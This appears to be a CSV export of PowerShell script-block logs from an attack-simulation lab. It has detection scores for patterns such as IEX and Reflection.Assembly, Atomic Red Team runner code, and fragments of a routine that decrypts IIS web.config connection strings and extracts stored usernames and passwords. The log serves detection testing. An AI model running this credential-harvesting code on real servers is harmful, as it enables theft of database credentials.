                $retry = $true; $count = 0
                while ($retry) {
                    Rename-Computer -NewName $newHostName -Force -Restart
                    Start-Sleep 120; $count = $count + 1
                    LogRunnerMsg ""Retrying computer rename $count""
                    if ($count -gt 60) { $retry = $false }
                }

                Start-Sleep -seconds 30
                LogRunnerMsg ""uh oh, still haven't restarted - should never get to here""
                $retry = $true; $count = 0
                while ($retry) {
                    $count = $count + 1
                    LogRunnerMsg ""Rename retry $count""
                    Restart-Computer -Force
                    Start-Sleep 300;
                    if ($count -gt 60) { $retry = $false }
                }
                exit
            }

        }

        function Get-TimingVariable ($sched) {
            $atcount = $sched.Count
            if ($null -eq $atcount) { $atcount = 1 }
            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds
            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds
            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay
            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time
            return $sleeptime
        }

        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest
        $htvars = @{}
        if ($OtherArgs) {
            $OtherArgs | ForEach-Object {
                if ($_ -match '^-') {
                    #New parameter
                    $lastvar = $_ -replace '^-'
                    $htvars[$lastvar] = $true
                }
                else {
                    #Value
                    $htvars[$lastvar] = $_
                }
            }
        }
        if ($PSBoundParameters.ContainsKey(""PauseBetweenAtomics"")) {
            $timeToPause = $PauseBetweenAtomics
        }
        else {
            $timeToPause = $null
        }
        $htvars += [Hashtable]$PSBoundParameters
        $htvars.Remove('listOfAtomics') | Out-Null
        $htvars.Remove('OtherArgs') | Out-Null
        $htvars.Remove('PauseBetweenAtomics') | Out-Null
        $htvars.Remove('scheduledTaskCleanup') | Out-Null

        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)

        # If the schedule is empty, end process
        if (-not $schedule) {
            LogRunnerMsg ""No test guid's or enabled tests.""
            return
        }

        # timing variables
        $SleepTillCleanup = Get-TimingVariable $schedule

        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit
        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {
            $schedule | ForEach-Object {
                Invoke-AtomicTestFromScheduleRow $_
            }
            return
        }

        # exit if file stop.txt is found
        If (Test-Path $artConfig.stopFile) {
            LogRunnerMsg ""exiting script because $($artConfig.stopFile) does exist""
            Write-Host -ForegroundColor Yellow ""Exiting script because $($artConfig.stopFile) does exist.""; Start-Sleep 10;
            exit
        }

        # Find current test to run
        $guid = Get-GuidFromHostName $artConfig.basehostname
        if ([string]::IsNullOrWhiteSpace($guid)) {
            LogRunnerMsg ""Test Guid ($guid) was null, using next item in the schedule""
        }
        else {
            if ($artConfig.verbose) { LogRunnerMsg ""Found Test: $guid specified in hostname"" }
            $sp = [Collections.Generic.List[Object]]$schedule
            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })
            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {
                $tr = $schedule[$currentIndex]
            }

            if ($null -ne $tr) {
                if ($scheduledTaskCleanup) {
                    # Cleanup after running test
                    Write-Host -Fore cyan ""Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) ""; Start-Sleep -Seconds $SleepTillCleanup
                    $htvars.Add(""Cleanup"", $true)
                    Invoke-AtomicTestFromScheduleRow $tr
                }
                else {
                    # run the atomic test and exit
                    Invoke-AtomicTestFromScheduleRow $tr
                    Start-Sleep 3; exit
                }
            }
            else {
                LogRunnerMsg ""Could not find Test: $guid in schedule. Please update schedule to run this test.""
            }
        }

        # Load next scheduled test before renaming computer
        $nextIndex += $currentIndex + 1
        if ($nextIndex -ge ($schedule.count)) {
            $tr = $schedule[0]
        }
        else {
            $tr = $schedule[$nextIndex]
        }

        if ($null -eq $tr) {
            LogRunnerMsg ""Could not determine the next row to execute from the schedule, Starting from 1st row"";
            $tr = $schedule[0]
        }

        #Rename Computer and Restart
        Rename-ThisComputer $tr $artConfig.basehostname

    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:55 PM","35710685","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","9912",". ""$PSScriptRoot\Invoke-RunnerScheduleMethods.ps1""

function Invoke-AtomicRunner {
    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false)]
        [switch]
        $CheckPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $GetPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $Cleanup,

        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false)]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false)]
        $ListOfAtomics,

        [Parameter(Mandatory = $false)]
        [switch]
        $anyOS = $false,

        [parameter(Mandatory = $false)]
        [ValidateRange(0, [int]::MaxValue)]
        [int] $PauseBetweenAtomics,

        [parameter(Mandatory = $false)]
        [switch] $scheduledTaskCleanup,

        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]
        $OtherArgs
    )
    Begin { }
    Process {

        function Get-GuidFromHostName( $basehostname ) {
            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + ""-""), """"

            if (!$guid) {
                LogRunnerMsg ""Hostname has not been updated or could not parse out the Guid: "" + $guid
                return
            }

            # Confirm hostname contains a guid
            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'

            if ($guid -match $guidRegex) { return $guid } else { return """" }
        }

        function Invoke-AtomicTestFromScheduleRow ($tr) {
            $theArgs = $tr.InputArgs
            if ($theArgs.GetType().Name -ne ""Hashtable"") {
                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs
            }
            $sc = $tr.AtomicsFolder
            #Run the Test based on if scheduleContext is 'private' or 'public'
            if (($sc -eq 'public') -or ($null -eq $sc)) {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            elseif ($sc -eq 'private') {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            if ($timeToPause -gt 0) {
                Write-Host ""Sleeping for $timeToPause seconds...""
                Start-Sleep $timeToPause
            }
            elseif ($timeToPause -eq 0) {
                Write-Host 'Press any key to continue...';
                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
            }
        }

        function Rename-ThisComputer ($tr, $basehostname) {
            $hash = $tr.auto_generated_guid

            $newHostName = ""$basehostname-$hash""
            $shouldRename = $true
            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }
            if ($artConfig.verbose) { LogRunnerMsg ""Setting hostname to $newHostName"" }

            If (Test-Path $artConfig.stopFile) {
                LogRunnerMsg ""exiting script because $($artConfig.stopFile) exists""
                exit
            }

            if ($IsLinux) {
                if ($shouldRename) { Invoke-Expression $(""hostnamectl set-hostname $newHostName"") }
                Invoke-Expression $(""shutdown -r now"")
            }
            if ($IsMacOS) {
                if ($shouldRename) {
                    Invoke-Expression $(""/usr/sbin/scutil --set HostName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set ComputerName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set LocalHostName $newHostName"")
                }
                Invoke-Expression $(""/sbin/shutdown -r now"")
            }
            else {
                if ($debug) { LogRunnerMsg ""Debug: pretending to rename the computer to $newHostName""; exit }
                if (-not $shouldRename) { Restart-Computer -Force }
                $retry = $true; $count = 0
                while ($retry) {
                    Rename-Computer -NewName $newHostName -Force -Restart
                    Start-Sleep 120; $count = $count + 1
                    LogRunnerMsg ""Retrying computer rename $count""
                    if ($count -gt 60) { $retry = $false }
                }

                Start-Sleep -seconds 30
                LogRunnerMsg ""uh oh, still haven't restarted - should never get to here""
                $retry = $true; $count = 0
                while ($retry) {
                    $count = $count + 1
                    LogRunnerMsg ""Rename retry $count""
                    Restart-Computer -Force
                    Start-Sleep 300;
                    if ($count -gt 60) { $retry = $false }
                }
                exit
            }

        }

        function Get-TimingVariable ($sched) {
            $atcount = $sched.Count
            if ($null -eq $atcount) { $atcount = 1 }
            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds
            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds
            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay
            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time
            return $sleeptime
        }

        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest
        $htvars = @{}
        if ($OtherArgs) {
            $OtherArgs | ForEach-Object {
                if ($_ -match '^-') {
                    #New parameter
                    $lastvar = $_ -replace '^-'
                    $htvars[$lastvar] = $true
                }
                else {
                    #Value
                    $htvars[$lastvar] = $_
                }
            }
        }
        if ($PSBoundParameters.ContainsKey(""PauseBetweenAtomics"")) {
            $timeToPause = $PauseBetweenAtomics
        }
        else {
            $timeToPause = $null
        }
        $htvars += [Hashtable]$PSBoundParameters
        $htvars.Remove('listOfAtomics') | Out-Null
        $htvars.Remove('OtherArgs') | Out-Null
        $htvars.Remove('PauseBetweenAtomics') | Out-Null
        $htvars.Remove('scheduledTaskCleanup') | Out-Null

        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)

        # If the schedule is empty, end process
        if (-not $schedule) {
            LogRunnerMsg ""No test guid's or enabled tests.""
            return
        }

        # timing variables
        $SleepTillCleanup = Get-TimingVariable $schedule

        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit
        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {
            $schedule | ForEach-Object {
                Invoke-AtomicTestFromScheduleRow $_
            }
            return
        }

        # exit if file stop.txt is found
        If (Test-Path $artConfig.stopFile) {
            LogRunnerMsg ""exiting script because $($artConfig.stopFile) does exist""
            Write-Host -ForegroundColor Yellow ""Exiting script because $($artConfig.stopFile) does exist.""; Start-Sleep 10;
            exit
        }

        # Find current test to run
        $guid = Get-GuidFromHostName $artConfig.basehostname
        if ([string]::IsNullOrWhiteSpace($guid)) {
            LogRunnerMsg ""Test Guid ($guid) was null, using next item in the schedule""
        }
        else {
            if ($artConfig.verbose) { LogRunnerMsg ""Found Test: $guid specified in hostname"" }
            $sp = [Collections.Generic.List[Object]]$schedule
            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })
            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {
                $tr = $schedule[$currentIndex]
            }

            if ($null -ne $tr) {
                if ($scheduledTaskCleanup) {
                    # Cleanup after running test
                    Write-Host -Fore cyan ""Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) ""; Start-Sleep -Seconds $SleepTillCleanup
                    $htvars.Add(""Cleanup"", $true)
                    Invoke-AtomicTestFromScheduleRow $tr
                }
                else {
                    # run the atomic test and exit
                    Invoke-AtomicTestFromScheduleRow $tr
                    Start-Sleep 3; exit
                }
            }
            else {
                LogRunnerMsg ""Could not find Test: $guid in schedule. Please update schedule to run this test.""
            }
        }

        # Load next scheduled test before renaming computer
        $nextIndex += $currentIndex + 1
        if ($nextIndex -ge ($schedule.count)) {
            $tr = $schedule[0]
        }
        else {
            $tr = $schedule[$nextIndex]
        }

        if ($null -eq $tr) {
            LogRunnerMsg ""Could not determine the next row to execute from the schedule, Starting from 1st row"";
            $tr = $schedule[0]
        }

        #Rename Computer and Restart
        Rename-ThisComputer $tr $artConfig.basehostname

    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:56 PM","35710876","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","9912",". ""$PSScriptRoot\Invoke-RunnerScheduleMethods.ps1""

function Invoke-AtomicRunner {
    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false)]
        [switch]
        $CheckPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $GetPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $Cleanup,

        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false)]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false)]
        $ListOfAtomics,

        [Parameter(Mandatory = $false)]
        [switch]
        $anyOS = $false,

        [parameter(Mandatory = $false)]
        [ValidateRange(0, [int]::MaxValue)]
        [int] $PauseBetweenAtomics,

        [parameter(Mandatory = $false)]
        [switch] $scheduledTaskCleanup,

        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]
        $OtherArgs
    )
    Begin { }
    Process {

        function Get-GuidFromHostName( $basehostname ) {
            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + ""-""), """"

            if (!$guid) {
                LogRunnerMsg ""Hostname has not been updated or could not parse out the Guid: "" + $guid
                return
            }

            # Confirm hostname contains a guid
            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'

            if ($guid -match $guidRegex) { return $guid } else { return """" }
        }

        function Invoke-AtomicTestFromScheduleRow ($tr) {
            $theArgs = $tr.InputArgs
            if ($theArgs.GetType().Name -ne ""Hashtable"") {
                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs
            }
            $sc = $tr.AtomicsFolder
            #Run the Test based on if scheduleContext is 'private' or 'public'
            if (($sc -eq 'public') -or ($null -eq $sc)) {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            elseif ($sc -eq 'private') {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            if ($timeToPause -gt 0) {
                Write-Host ""Sleeping for $timeToPause seconds...""
                Start-Sleep $timeToPause
            }
            elseif ($timeToPause -eq 0) {
                Write-Host 'Press any key to continue...';
                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
            }
        }

        function Rename-ThisComputer ($tr, $basehostname) {
            $hash = $tr.auto_generated_guid

            $newHostName = ""$basehostname-$hash""
            $shouldRename = $true
            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }
            if ($artConfig.verbose) { LogRunnerMsg ""Setting hostname to $newHostName"" }

            If (Test-Path $artConfig.stopFile) {
                LogRunnerMsg ""exiting script because $($artConfig.stopFile) exists""
                exit
            }

            if ($IsLinux) {
                if ($shouldRename) { Invoke-Expression $(""hostnamectl set-hostname $newHostName"") }
                Invoke-Expression $(""shutdown -r now"")
            }
            if ($IsMacOS) {
                if ($shouldRename) {
                    Invoke-Expression $(""/usr/sbin/scutil --set HostName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set ComputerName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set LocalHostName $newHostName"")
                }
                Invoke-Expression $(""/sbin/shutdown -r now"")
            }
            else {
                if ($debug) { LogRunnerMsg ""Debug: pretending to rename the computer to $newHostName""; exit }
                if (-not $shouldRename) { Restart-Computer -Force }
                $retry = $true; $count = 0
                while ($retry) {
                    Rename-Computer -NewName $newHostName -Force -Restart
                    Start-Sleep 120; $count = $count + 1
                    LogRunnerMsg ""Retrying computer rename $count""
                    if ($count -gt 60) { $retry = $false }
                }

                Start-Sleep -seconds 30
                LogRunnerMsg ""uh oh, still haven't restarted - should never get to here""
                $retry = $true; $count = 0
                while ($retry) {
                    $count = $count + 1
                    LogRunnerMsg ""Rename retry $count""
                    Restart-Computer -Force
                    Start-Sleep 300;
                    if ($count -gt 60) { $retry = $false }
                }
                exit
            }

        }

        function Get-TimingVariable ($sched) {
            $atcount = $sched.Count
            if ($null -eq $atcount) { $atcount = 1 }
            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds
            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds
            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay
            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time
            return $sleeptime
        }

        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest
        $htvars = @{}
        if ($OtherArgs) {
            $OtherArgs | ForEach-Object {
                if ($_ -match '^-') {
                    #New parameter
                    $lastvar = $_ -replace '^-'
                    $htvars[$lastvar] = $true
                }
                else {
                    #Value
                    $htvars[$lastvar] = $_
                }
            }
        }
        if ($PSBoundParameters.ContainsKey(""PauseBetweenAtomics"")) {
            $timeToPause = $PauseBetweenAtomics
        }
        else {
            $timeToPause = $null
        }
        $htvars += [Hashtable]$PSBoundParameters
        $htvars.Remove('listOfAtomics') | Out-Null
        $htvars.Remove('OtherArgs') | Out-Null
        $htvars.Remove('PauseBetweenAtomics') | Out-Null
        $htvars.Remove('scheduledTaskCleanup') | Out-Null

        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)

        # If the schedule is empty, end process
        if (-not $schedule) {
            LogRunnerMsg ""No test guid's or enabled tests.""
            return
        }

        # timing variables
        $SleepTillCleanup = Get-TimingVariable $schedule

        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit
        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {
            $schedule | ForEach-Object {
                Invoke-AtomicTestFromScheduleRow $_
            }
            return
        }

        # exit if file stop.txt is found
        If (Test-Path $artConfig.stopFile) {
            LogRunnerMsg ""exiting script because $($artConfig.stopFile) does exist""
            Write-Host -ForegroundColor Yellow ""Exiting script because $($artConfig.stopFile) does exist.""; Start-Sleep 10;
            exit
        }

        # Find current test to run
        $guid = Get-GuidFromHostName $artConfig.basehostname
        if ([string]::IsNullOrWhiteSpace($guid)) {
            LogRunnerMsg ""Test Guid ($guid) was null, using next item in the schedule""
        }
        else {
            if ($artConfig.verbose) { LogRunnerMsg ""Found Test: $guid specified in hostname"" }
            $sp = [Collections.Generic.List[Object]]$schedule
            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })
            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {
                $tr = $schedule[$currentIndex]
            }

            if ($null -ne $tr) {
                if ($scheduledTaskCleanup) {
                    # Cleanup after running test
                    Write-Host -Fore cyan ""Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) ""; Start-Sleep -Seconds $SleepTillCleanup
                    $htvars.Add(""Cleanup"", $true)
                    Invoke-AtomicTestFromScheduleRow $tr
                }
                else {
                    # run the atomic test and exit
                    Invoke-AtomicTestFromScheduleRow $tr
                    Start-Sleep 3; exit
                }
            }
            else {
                LogRunnerMsg ""Could not find Test: $guid in schedule. Please update schedule to run this test.""
            }
        }

        # Load next scheduled test before renaming computer
        $nextIndex += $currentIndex + 1
        if ($nextIndex -ge ($schedule.count)) {
            $tr = $schedule[0]
        }
        else {
            $tr = $schedule[$nextIndex]
        }

        if ($null -eq $tr) {
            LogRunnerMsg ""Could not determine the next row to execute from the schedule, Starting from 1st row"";
            $tr = $schedule[0]
        }

        #Rename Computer and Restart
        Rename-ThisComputer $tr $artConfig.basehostname

    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:45 PM","35709071","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","4023","{

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path ""$Env:SystemRoot\Microsoft.NET\Framework\"" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf ""connectionStrings"" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose ""Decryption of $CurrentPath failed.""
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:45 PM","35709064","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","4562","{

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like ""*%*"") {
                $EnvarName = ""`$Env:""+$_.split(""%"")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path ""$Env:SystemRoot\Microsoft.NET\Framework\"" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf ""connectionStrings"" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose ""Decryption of $CurrentPath failed.""
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:54 PM","35710637","2",", SuspiciousKeyword, Reflection","SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","831","function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
